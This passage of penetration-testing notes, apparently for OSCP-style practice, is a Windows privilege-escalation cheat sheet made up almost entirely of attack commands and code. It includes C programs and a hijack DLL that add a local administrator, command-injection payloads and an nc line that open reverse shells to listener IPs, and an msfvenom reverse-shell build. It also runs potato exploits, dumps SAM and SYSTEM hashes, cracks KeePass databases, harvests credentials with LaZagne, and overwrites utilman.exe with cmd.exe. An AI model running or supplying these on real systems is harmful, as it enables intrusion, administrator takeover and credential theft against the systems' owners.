<span class="nx">$ModifiableFiles</span> <span class="o">=</span> <span class="nx">echo</span> <span class="dl">'</span><span class="s1">C:</span><span class="se">\</span><span class="s1">xampp</span><span class="se">\</span><span class="s1">mysql</span><span class="se">\</span><span class="s1">bin</span><span class="se">\</span><span class="s1">mysqld.exe argument</span><span class="dl">'</span> <span class="o">|</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">ModifiablePath</span> <span class="o">-</span><span class="nx">Literal</span>
<span class="nx">$ModifiableFiles</span>

<span class="c1">//check auto_start</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">WmiObject</span> <span class="o">-</span><span class="kd">class</span> <span class="nx">Win32_Service</span> <span class="o">-</span><span class="nx">Property</span> <span class="nx">Name</span><span class="p">,</span> <span class="nx">DisplayName</span><span class="p">,</span> <span class="nx">PathName</span><span class="p">,</span> <span class="nx">StartMode</span> <span class="o">|</span> <span class="nx">Where</span> <span class="p">{</span><span class="nx">$_</span><span class="p">.</span><span class="nx">PathName</span> <span class="o">-</span><span class="nx">notlike</span> <span class="dl">"</span><span class="s2">C:</span><span class="se">\</span><span class="s2">Windows*</span><span class="dl">"</span> <span class="o">-</span><span class="nx">and</span> <span class="nx">$_</span><span class="p">.</span><span class="nx">PathName</span> <span class="o">-</span><span class="nx">notlike</span> <span class="dl">'</span><span class="s1">"*</span><span class="dl">'</span><span class="p">}</span> <span class="o">|</span> <span class="nx">select</span> <span class="nx">Name</span><span class="p">,</span><span class="nx">DisplayName</span><span class="p">,</span><span class="nx">StartMode</span><span class="p">,</span><span class="nx">PathName</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">Service</span> <span class="nx">service</span><span class="err">#</span><span class="nx">service</span> <span class="nx">list</span>
<span class="nx">cmd</span> <span class="o">/</span><span class="nx">c</span> <span class="nx">wmic</span> <span class="nx">service</span> <span class="kd">get</span> <span class="nx">name</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">startmode</span> <span class="o">|</span><span class="nx">findstr</span> <span class="o">/</span><span class="nx">i</span> <span class="dl">"</span><span class="s2">auto</span><span class="dl">"</span>

<span class="nx">stop</span><span class="o">-</span><span class="nx">service</span> <span class="nx">service</span>
<span class="nx">start</span><span class="o">-</span><span class="nx">service</span> <span class="nx">service</span>
<span class="nx">cmd</span> <span class="o">/</span><span class="nx">c</span> <span class="nx">sc</span> <span class="nx">qc</span> <span class="nx">GPGOrchestrator</span> <span class="err">#</span><span class="nx">check</span> <span class="nx">service</span> <span class="nx">detail</span>
<span class="nx">cmd</span> <span class="o">/</span><span class="nx">c</span> <span class="nx">sc</span> <span class="nx">start</span> <span class="nx">auditTracker</span>
<span class="c1">//c:\windows\system32\sc.exe </span>

<span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">DevelopmentExecutables</span><span class="o">&gt;</span><span class="nx">sc</span> <span class="nx">qc</span> <span class="nx">auditTracker</span>

<span class="p">[</span><span class="nx">SC</span><span class="p">]</span> <span class="nx">QueryServiceConfig</span> <span class="nx">SUCCESS</span>

<span class="nx">SERVICE_NAME</span><span class="p">:</span> <span class="nx">auditTracker</span>
        <span class="nx">TYPE</span>               <span class="p">:</span> <span class="mi">10</span>  <span class="nx">WIN32_OWN_PROCESS</span>
        <span class="nx">START_TYPE</span>         <span class="p">:</span> <span class="mi">2</span>   <span class="nx">AUTO_START</span>
        <span class="nx">ERROR_CONTROL</span>      <span class="p">:</span> <span class="mi">1</span>   <span class="nx">NORMAL</span>
        <span class="nx">BINARY_PATH_NAME</span>   <span class="p">:</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">DevelopmentExecutables</span><span class="err">\</span><span class="nx">auditTracker</span><span class="p">.</span><span class="nx">exe</span>
        <span class="nx">LOAD_ORDER_GROUP</span>   <span class="p">:</span>
        <span class="nx">TAG</span>                <span class="p">:</span> <span class="mi">0</span>
        <span class="nx">DISPLAY_NAME</span>       <span class="p">:</span> <span class="nx">auditTracker</span>
        <span class="nx">DEPENDENCIES</span>       <span class="p">:</span>
        <span class="nx">SERVICE_START_NAME</span> <span class="p">:</span> <span class="nx">LocalSystem</span>

<span class="nx">sc</span> <span class="nx">start</span> <span class="nx">auditTracker</span>

</code></pre></div></div>

<p>Add User</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">stdlib</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>

<span class="nx">int</span> <span class="nx">main</span> <span class="p">()</span>
<span class="p">{</span>
  <span class="nx">int</span> <span class="nx">i</span><span class="p">;</span>
  
  <span class="nx">i</span> <span class="o">=</span> <span class="nx">system</span> <span class="p">(</span><span class="dl">"</span><span class="s2">net user dave2 password123! /add</span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">i</span> <span class="o">=</span> <span class="nx">system</span> <span class="p">(</span><span class="dl">"</span><span class="s2">net localgroup administrators dave2 /add</span><span class="dl">"</span><span class="p">);</span>
  
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">x86_64</span><span class="o">-</span><span class="nx">w64</span><span class="o">-</span><span class="nx">mingw32</span><span class="o">-</span><span class="nx">gcc</span> <span class="nx">adduser</span><span class="p">.</span><span class="nx">c</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">adduser</span><span class="p">.</span><span class="nx">exe</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">LocalGroupMember</span> <span class="nx">administrators</span>
</code></pre></div></div>

<h3 id="unquoted-service">Unquoted Service</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//BUILTIN\Users:(CI)(S,WD,AD)</span>
<span class="nx">icacls</span> <span class="dl">"</span><span class="s2">C:</span><span class="se">\</span><span class="s2">Skylark</span><span class="se">\</span><span class="s2">Development Binaries 01</span><span class="dl">"</span> 
<span class="nx">Get</span><span class="o">-</span><span class="nx">CimInstance</span> <span class="o">-</span><span class="nx">ClassName</span> <span class="nx">win32_service</span> <span class="o">|</span> <span class="nx">Select</span> <span class="nx">Name</span><span class="p">,</span><span class="nx">State</span><span class="p">,</span><span class="nx">PathName</span> <span class="o">|</span> <span class="nx">Where</span><span class="o">-</span><span class="nb">Object</span> <span class="p">{</span><span class="nx">$_</span><span class="p">.</span><span class="nx">State</span> <span class="o">-</span><span class="nx">like</span> <span class="dl">'</span><span class="s1">Running</span><span class="dl">'</span><span class="p">}</span>
<span class="nx">wmic</span> <span class="nx">service</span> <span class="kd">get</span> <span class="nx">name</span><span class="p">,</span><span class="nx">pathname</span> <span class="o">|</span>  <span class="nx">findstr</span> <span class="o">/</span><span class="nx">i</span> <span class="o">/</span><span class="nx">v</span> <span class="dl">"</span><span class="s2">C:</span><span class="se">\</span><span class="s2">Windows</span><span class="se">\\</span><span class="dl">"</span> <span class="o">|</span> <span class="nx">findstr</span> <span class="o">/</span><span class="nx">i</span> <span class="o">/</span><span class="nx">v</span> <span class="dl">"""</span><span class="s2">  #cmd
copy C:</span><span class="se">\</span><span class="s2">Users</span><span class="se">\</span><span class="s2">Public</span><span class="se">\r</span><span class="s2">s.exe Development.exe
Start-Service DevService 
Stop-Service DevService 

//powerUp.ps1
powershell -ep bypass
. .</span><span class="se">\</span><span class="s2">PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name 'GammaService' -Path </span><span class="dl">"</span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Program</span> <span class="nx">Files</span><span class="err">\</span><span class="nx">Enterprise</span> <span class="nx">Apps</span><span class="err">\</span><span class="nx">Current</span><span class="p">.</span><span class="nx">exe</span><span class="dl">"</span><span class="s2">
Restart-Service GammaService
//john
net user 
net localgroup administrators
</span></code></pre></div></div>

<h3 id="service-dll-hijacking">Service DLL Hijacking</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">.</span> <span class="nx">The</span> <span class="nx">directory</span> <span class="k">from</span> <span class="nx">which</span> <span class="nx">the</span> <span class="nx">application</span> <span class="nx">loaded</span><span class="p">.</span>
<span class="mi">2</span><span class="p">.</span> <span class="nx">The</span> <span class="nx">system</span> <span class="nx">directory</span><span class="p">.</span>
<span class="mi">3</span><span class="p">.</span> <span class="nx">The</span> <span class="mi">16</span><span class="o">-</span><span class="nx">bit</span> <span class="nx">system</span> <span class="nx">directory</span><span class="p">.</span>
<span class="mi">4</span><span class="p">.</span> <span class="nx">The</span> <span class="nx">Windows</span> <span class="nx">directory</span><span class="p">.</span> 
<span class="mi">5</span><span class="p">.</span> <span class="nx">The</span> <span class="nx">current</span> <span class="nx">directory</span><span class="p">.</span>
<span class="mi">6</span><span class="p">.</span> <span class="nx">The</span> <span class="nx">directories</span> <span class="nx">that</span> <span class="nx">are</span> <span class="nx">listed</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">PATH</span> <span class="nx">environment</span> <span class="nx">variable</span><span class="p">.</span>

<span class="c1">//check log file to find lacked dll</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">CimInstance</span> <span class="o">-</span><span class="nx">ClassName</span> <span class="nx">win32_service</span> <span class="o">|</span> <span class="nx">Select</span> <span class="nx">Name</span><span class="p">,</span><span class="nx">State</span><span class="p">,</span><span class="nx">PathName</span> <span class="o">|</span> <span class="nx">Where</span><span class="o">-</span><span class="nb">Object</span> <span class="p">{</span><span class="nx">$_</span><span class="p">.</span><span class="nx">State</span> <span class="o">-</span><span class="nx">like</span> <span class="dl">'</span><span class="s1">Running</span><span class="dl">'</span><span class="p">}</span>
<span class="nx">icacls</span> <span class="p">.</span><span class="err">\</span><span class="nx">Documents</span><span class="err">\</span><span class="nx">BetaServ</span><span class="p">.</span><span class="nx">exe</span>
<span class="nx">x86_64</span><span class="o">-</span><span class="nx">w64</span><span class="o">-</span><span class="nx">mingw32</span><span class="o">-</span><span class="nx">gcc</span> <span class="nx">myDLL</span><span class="p">.</span><span class="nx">cpp</span> <span class="o">--</span><span class="nx">shared</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">myDLL</span><span class="p">.</span><span class="nx">dll</span>
<span class="c1">//i686-w64-mingw32-gcc for 32bit dll</span>
<span class="nx">Restart</span><span class="o">-</span><span class="nx">Service</span> <span class="nx">BetaService</span>
<span class="nx">net</span> <span class="nx">localgroup</span> <span class="nx">administrators</span>
</code></pre></div></div>

<p>Add user</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">stdlib</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">windows</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>

<span class="nx">BOOL</span> <span class="nx">APIENTRY</span> <span class="nx">DllMain</span><span class="p">(</span>
<span class="nx">HANDLE</span> <span class="nx">hModule</span><span class="p">,</span><span class="c1">// Handle to DLL module</span>
<span class="nx">DWORD</span> <span class="nx">ul_reason_for_call</span><span class="p">,</span><span class="c1">// Reason for calling function</span>
<span class="nx">LPVOID</span> <span class="nx">lpReserved</span> <span class="p">)</span> <span class="c1">// Reserved</span>
<span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="nx">ul_reason_for_call</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">case</span> <span class="nx">DLL_PROCESS_ATTACH</span><span class="p">:</span> <span class="c1">// A process is loading the DLL.</span>
        <span class="nx">int</span> <span class="nx">i</span><span class="p">;</span>
  	    <span class="nx">i</span> <span class="o">=</span> <span class="nx">system</span> <span class="p">(</span><span class="dl">"</span><span class="s2">net user dave2 password123! /add</span><span class="dl">"</span><span class="p">);</span>
  	    <span class="nx">i</span> <span class="o">=</span> <span class="nx">system</span> <span class="p">(</span><span class="dl">"</span><span class="s2">net localgroup administrators dave2 /add</span><span class="dl">"</span><span class="p">);</span>
  	    <span class="c1">//i = system ("C:\Services\nc.exe 192.168.45.201 4444 -e powershell");</span>
        <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nx">DLL_THREAD_ATTACH</span><span class="p">:</span> <span class="c1">// A process is creating a new thread.</span>
        <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nx">DLL_THREAD_DETACH</span><span class="p">:</span> <span class="c1">// A thread exits normally.</span>
        <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nx">DLL_PROCESS_DETACH</span><span class="p">:</span> <span class="c1">// A process unloads the DLL.</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="os-command-injection">OS Command Injection</h3>

<p>Directly try reverse shell</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">conf</span><span class="o">&gt;</span> <span class="nx">write_config</span> <span class="mi">123</span><span class="dl">'</span><span class="s1">; powershell -c C:</span><span class="se">\</span><span class="s1">Users</span><span class="se">\</span><span class="s1">Public</span><span class="se">\r</span><span class="s1">s.exe; </span><span class="dl">'</span><span class="mi">123</span>

<span class="p">{</span>
	<span class="dl">"</span><span class="s2">user</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">clumsyadmin</span><span class="dl">"</span><span class="p">,</span> 
	<span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">http://192.168.1.1/rs.elf; nc 192.168.1.1 4444 -e /bin/bash</span><span class="dl">"</span>
<span class="p">}</span> 
</code></pre></div></div>

<h3 id="interesting-file">Interesting file</h3>

<p>History</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Get</span><span class="o">-</span><span class="nx">History</span>
<span class="p">(</span><span class="nx">Get</span><span class="o">-</span><span class="nx">PSReadlineOption</span><span class="p">).</span><span class="nx">HistorySavePath</span>
</code></pre></div></div>

<p>.git</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Get</span><span class="o">-</span><span class="nc">ChildItem</span> <span class="o">-</span><span class="nc">Path</span> <span class="nc">C</span><span class="o">:</span><span class="err">\</span> <span class="o">-</span><span class="nc">Recurse</span> <span class="o">-</span><span class="nc">Force</span> <span class="o">-</span><span class="nc">Directory</span> <span class="o">-</span><span class="nc">ErrorAction</span> <span class="nc">SilentlyContinue</span> <span class="o">|</span> <span class="nc">Where</span><span class="o">-</span><span class="nc">Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="mf">.</span><span class="nc">Name</span> <span class="o">-</span><span class="n">eq</span> <span class="s1">'.git'</span> <span class="p">}</span> <span class="o">|</span> <span class="nc">Select</span><span class="o">-</span><span class="nc">Object</span> <span class="nc">FullName</span>
</code></pre></div></div>

<p>.kdbx</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Get</span><span class="o">-</span><span class="nx">ChildItem</span> <span class="o">-</span><span class="nx">Path</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span> <span class="o">-</span><span class="nx">Include</span> <span class="o">*</span><span class="p">.</span><span class="nx">kdbx</span> <span class="o">-</span><span class="nx">File</span> <span class="o">-</span><span class="nx">Recurse</span> <span class="o">-</span><span class="nx">ErrorAction</span> <span class="nx">SilentlyContinue</span>
<span class="nx">keepass2john</span> <span class="nx">Database</span><span class="p">.</span><span class="nx">kdbx</span> <span class="o">&gt;</span> <span class="nx">keepass</span><span class="p">.</span><span class="nx">hash</span>
<span class="nx">hashcat</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">13400</span> <span class="nx">keepass</span><span class="p">.</span><span class="nx">hash</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="o">--</span><span class="nx">force</span>
<span class="nx">john</span> <span class="o">--</span><span class="nx">wordlist</span><span class="o">=</span><span class="sr">/usr/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">fasttrack</span><span class="p">.</span><span class="nx">txt</span>  <span class="nx">keepass</span><span class="p">.</span><span class="nx">hash</span>
<span class="nx">keepassxc</span> <span class="nx">Database</span><span class="p">.</span><span class="nx">kdbx</span>
</code></pre></div></div>

<p>user folder</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Get</span><span class="o">-</span><span class="nx">ChildItem</span> <span class="o">-</span><span class="nx">Path</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">xampp</span> <span class="o">-</span><span class="nx">Include</span> <span class="o">*</span><span class="p">.</span><span class="nx">txt</span><span class="p">,</span><span class="o">*</span><span class="p">.</span><span class="nx">ini</span> <span class="o">-</span><span class="nx">File</span> <span class="o">-</span><span class="nx">Recurse</span> <span class="o">-</span><span class="nx">ErrorAction</span> <span class="nx">SilentlyContinue</span>
<span class="nx">tree</span> <span class="o">/</span><span class="nx">f</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="o">\</span>

<span class="err">\</span><span class="nx">Desktop</span>
<span class="err">\</span><span class="nx">Document</span>
<span class="nx">C</span><span class="p">:</span><span class="o">\</span>
</code></pre></div></div>

<p>Windows.old</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">windows</span><span class="p">.</span><span class="nx">old</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">system32</span><span class="o">\</span>
<span class="o">*</span><span class="nx">Evil</span><span class="o">-</span><span class="nx">WinRM</span><span class="o">*</span> <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">windows</span><span class="p">.</span><span class="nx">old</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">system32</span><span class="o">&gt;</span> <span class="nx">download</span> <span class="nx">SAM</span> <span class="p">.</span>
<span class="o">*</span><span class="nx">Evil</span><span class="o">-</span><span class="nx">WinRM</span><span class="o">*</span> <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">windows</span><span class="p">.</span><span class="nx">old</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">system32</span><span class="o">&gt;</span> <span class="nx">download</span> <span class="nx">SYSTEM</span> <span class="p">.</span>
<span class="nx">secretsdump</span><span class="p">.</span><span class="nx">py</span> <span class="nx">LOCAL</span> <span class="o">-</span><span class="nx">ntds</span> <span class="nx">ntds</span><span class="p">.</span><span class="nx">dit</span> <span class="o">-</span><span class="nx">system</span> <span class="nx">SYSTEM</span> <span class="o">-</span><span class="nx">outputfile</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">secretsdump</span><span class="p">.</span><span class="nx">py</span> <span class="o">-</span><span class="nx">sam</span> <span class="nx">SAM</span> <span class="o">-</span><span class="nx">security</span> <span class="nx">security</span> <span class="o">-</span><span class="nx">system</span> <span class="nx">SYSTEM</span> <span class="nx">LOCAL</span>
</code></pre></div></div>

<h3 id="privilege">Privilege</h3>

<p>SeImpersonate</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">whoami</span> <span class="o">/</span><span class="nx">priv</span>

<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">18.1</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="nx">EXITFUNC</span><span class="o">=</span><span class="nx">thread</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">exe</span> <span class="o">--</span><span class="nx">platform</span> <span class="nx">windows</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">rs</span><span class="p">.</span><span class="nx">exe</span>

<span class="p">.</span><span class="err">\</span><span class="nx">JuicyPotatoNG</span><span class="p">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">t</span> <span class="o">*</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">rs</span><span class="p">.</span><span class="nx">exe</span>

<span class="c1">//Windows 10 and Server 2016/2019</span>

<span class="nx">If</span> <span class="nx">spooler</span> <span class="nx">service</span> <span class="nx">is</span> <span class="nx">stopped</span><span class="p">,</span> <span class="nx">printspoofer</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">will</span> <span class="nx">not</span> <span class="nx">work</span>
<span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Services</span><span class="o">&gt;</span> <span class="kd">get</span><span class="o">-</span><span class="nx">service</span> <span class="o">|</span> <span class="nx">findstr</span> <span class="o">-</span><span class="nx">i</span> <span class="dl">"</span><span class="s2">spooler</span><span class="dl">"</span>
<span class="kd">get</span><span class="o">-</span><span class="nx">service</span> <span class="o">|</span> <span class="nx">findstr</span> <span class="o">-</span><span class="nx">i</span> <span class="dl">"</span><span class="s2">spooler</span><span class="dl">"</span>
<span class="nx">Stopped</span>  <span class="nx">Spooler</span>            <span class="nx">Print</span> <span class="nx">Spooler</span>  

<span class="p">.</span><span class="err">\</span><span class="nx">PrintSpoofer64</span><span class="p">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">c</span> <span class="nx">rs</span><span class="p">.</span><span class="nx">exe</span>

<span class="c1">//Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">ChildItem</span> <span class="dl">'</span><span class="s1">HKLM:</span><span class="se">\</span><span class="s1">SOFTWARE</span><span class="se">\</span><span class="s1">Microsoft</span><span class="se">\</span><span class="s1">NET Framework Setup</span><span class="se">\</span><span class="s1">NDP</span><span class="dl">'</span> <span class="o">-</span><span class="nx">Recurse</span> <span class="o">|</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">ItemProperty</span> <span class="o">-</span><span class="nx">Name</span> <span class="nx">version</span> <span class="o">-</span><span class="nx">EA</span> <span class="mi">0</span> <span class="o">|</span> <span class="nx">Where</span> <span class="p">{</span> <span class="nx">$_</span><span class="p">.</span><span class="nx">PSChildName</span> <span class="o">-</span><span class="nx">Match</span> <span class="dl">'</span><span class="s1">^(?!S)</span><span class="se">\</span><span class="s1">p{L}</span><span class="dl">'</span><span class="p">}</span> <span class="o">|</span> <span class="nx">Select</span> <span class="nx">PSChildName</span><span class="p">,</span> <span class="nx">version</span>
<span class="p">.</span><span class="err">\</span><span class="nx">GodPotato</span><span class="p">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">cmd</span> <span class="dl">"</span><span class="s2">cmd /c rs.exe</span><span class="dl">"</span>

</code></pre></div></div>

<p>SeBackupPrivilege</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//may also works when Privilege enabled / presented but disabled</span>
<span class="nx">robocopy</span> <span class="o">/</span><span class="nx">b</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">enterpriseadmin</span><span class="err">\</span><span class="nx">Desktop</span><span class="err">\</span> <span class="p">.</span><span class="err">\</span><span class="nx">stolen</span>
</code></pre></div></div>

<p>SeRestorePrivilege</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">rename</span><span class="o">-</span><span class="nx">item</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">system32</span><span class="err">\</span><span class="nx">utilman</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">system32</span><span class="err">\</span><span class="nx">utilman</span><span class="p">.</span><span class="nx">old</span>
<span class="nx">rename</span><span class="o">-</span><span class="nx">item</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">system32</span><span class="err">\</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">system32</span><span class="err">\</span><span class="nx">utilman</span><span class="p">.</span><span class="nx">exe</span>

<span class="nx">rdesktop</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">15.1</span>
<span class="nx">WIN</span> <span class="o">+</span> <span class="nx">U</span>
</code></pre></div></div>

<h3 id="switch-user">Switch User</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">runas</span><span class="w">  </span><span class="nx">/user:backupadmin</span><span class="w"> </span><span class="nx">cmd</span><span class="w">  </span><span class="c">#require GUI</span><span class="w">

</span><span class="n">https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1</span><span class="w">
</span><span class="nx">Invoke-RunasCs</span><span class="w"> </span><span class="nt">-Username</span><span class="w"> </span><span class="nx">svc_mssql</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="nx">trustno1</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"whoami"</span><span class="w">
</span><span class="n">Invoke-RunasCs</span><span class="w"> </span><span class="nt">-Username</span><span class="w"> </span><span class="nx">svc_mssql</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="nx">trustno1</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"C:\transfer\rs.exe"</span><span class="w">
</span><span class="o">.</span><span class="n">\RunasCs.exe</span><span class="w"> </span><span class="nx">thecybergeek</span><span class="w"> </span><span class="nx">winniethepooh</span><span class="w"> </span><span class="s2">"whoami"</span><span class="w"> </span><span class="nt">--bypass-uac</span><span class="w"> </span><span class="nt">--logon-type</span><span class="w"> </span><span class="s1">'5'</span><span class="w">

</span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"password!!"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s2">"daveadmin"</span><span class="p">,</span><span class="w"> </span><span class="nv">$password</span><span class="p">)</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">CLIENTWK220</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w">
</span><span class="n">whoami</span><span class="w">

</span><span class="n">impacket-psexec</span><span class="w"> </span><span class="nx">vector/administrator</span><span class="err">@</span><span class="nx">192.168.1.1</span><span class="w">
</span></code></pre></div></div>

<h3 id="credentials">Credentials</h3>

<blockquote>
  <p>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#files-and-registry-credentials</p>

</blockquote>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">findstr</span> <span class="o">/</span><span class="nx">si</span> <span class="nx">password</span> <span class="o">*</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">dir</span> <span class="o">/</span><span class="nx">s</span> <span class="o">*</span><span class="nx">pass</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="nx">cred</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="nx">vnc</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="p">.</span><span class="nx">config</span><span class="o">*</span>
<span class="nx">findstr</span> <span class="o">/</span><span class="nx">spin</span> <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span>

<span class="c1">//command line history</span>
<span class="p">(</span><span class="nx">Get</span><span class="o">-</span><span class="nx">PSReadlineOption</span><span class="p">).</span><span class="nx">HistorySavePath</span>
<span class="c1">//putty</span>
<span class="nx">reg</span> <span class="nx">query</span> <span class="dl">"</span><span class="s2">HKCU</span><span class="se">\</span><span class="s2">Software</span><span class="se">\</span><span class="s2">SimonTatham</span><span class="se">\</span><span class="s2">PuTTY</span><span class="se">\</span><span class="s2">Sessions</span><span class="dl">"</span>

<span class="p">.</span> <span class="p">.</span><span class="err">\</span><span class="nx">LaZagne</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">all</span>

<span class="p">.</span> <span class="p">.</span><span class="err">\</span><span class="nx">sessionGopher</span><span class="p">.</span><span class="nx">ps1</span>
<span class="nx">Invoke</span><span class="o">-</span><span class="nx">SessionGopher</span> <span class="o">-</span><span class="nx">Thorough</span>

<span class="nx">cmdkey</span> <span class="o">/</span><span class="nx">list</span>

<span class="o">*</span><span class="nx">Evil</span><span class="o">-</span><span class="nx">WinRM</span><span class="o">*</span> <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">windows</span><span class="p">.</span><span class="nx">old</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">system32</span><span class="o">&gt;</span> <span class="nx">download</span> <span class="nx">SAM</span> <span class="p">.</span>
